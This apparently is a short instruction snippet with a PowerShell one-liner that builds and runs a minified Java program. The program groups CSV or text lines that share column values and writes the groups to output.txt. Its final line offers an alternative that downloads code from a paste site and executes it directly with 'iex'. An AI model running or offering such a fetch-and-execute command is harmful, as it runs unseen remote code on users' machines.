Enter in powershell: <br>
`'import java.io.*;import java.nio.file.*;import java.util.*;import java.util.regex.*;import static java.lang.System.*;class A{ List<String>a=new ArrayList<>();Map<String,Integer>b=new HashMap<>();Map<Integer,Set<Integer>>c=new HashMap<>();Map<Integer,Integer>d=new HashMap<>();public static void main(String[]e){new A().a(e);}void a(String[]e){var f=currentTimeMillis();g(e);int h=0;for(int i=0;i<a.size();i++){var j=a.get(i).split(";");int k=-1;for(int l=0;l<j.length;l++){var m=j[l];if(m.length()>2){var n=m+l;if(!b.containsKey(n)){if(k<0){k=h++;b.put(n,k);c.computeIfAbsent(k,o->new HashSet<>()).add(i);}else b.put(n,k);}else{if(k<0){int o=b.get(n);while(d.get(o)!=null)o=d.get(o);k=o;b.put(n,k);c.computeIfAbsent(k,z->new HashSet<>()).add(i);}else{int o=b.get(n);while(d.get(o)!=null){int p=o;o=d.get(o);d.put(p,k);}if(k!=o){d.put(o,k);c.computeIfAbsent(k,z->new HashSet<>()).addAll(c.get(o));c.remove(o);}}}}}}x();out.println("time:"+(currentTimeMillis()-f)+"ms");}void g(String[]e){if(e.length>0){var l=Path.of(e[0]);try(var h=new BufferedReader(new FileReader(l.toFile()))){String m;var n=Pattern.compile("^(\"[^\"]*\";)*\"[^\"]*\";?").asMatchPredicate();while((m=h.readLine())!=null)if(n.test(m))a.add(m);}catch(Exception x){}}}void x(){try(var i=new FileWriter("output.txt")){List<Set<Integer>>j=new ArrayList<>();for(int k:c.keySet()){while(d.get(k)!=null)k=d.get(k);if(c.containsKey(k)&&(c.get(k).size()>1))j.add(c.get(k));}int l=1;i.write("GroupsCount:"+j.size()+"\n");j.sort((m,n)->Integer.compare(n.size(),m.size()));for(var o:j){i.write("Group"+l+++"\n");for(int p:o)i.write(a.get(p)+"\n");}}catch(Exception o){}}}'|Out-File -encoding ascii A.java;javac A.java;Remove-Item A.java;java -cp .\ A $file;Remove-Item A.class`
<br>
You need to change $file to your exist file in .txt or .csv

Or use `iex "&{$(irm https://p.whitebeef.ru/secret )} .\lng-big.csv"`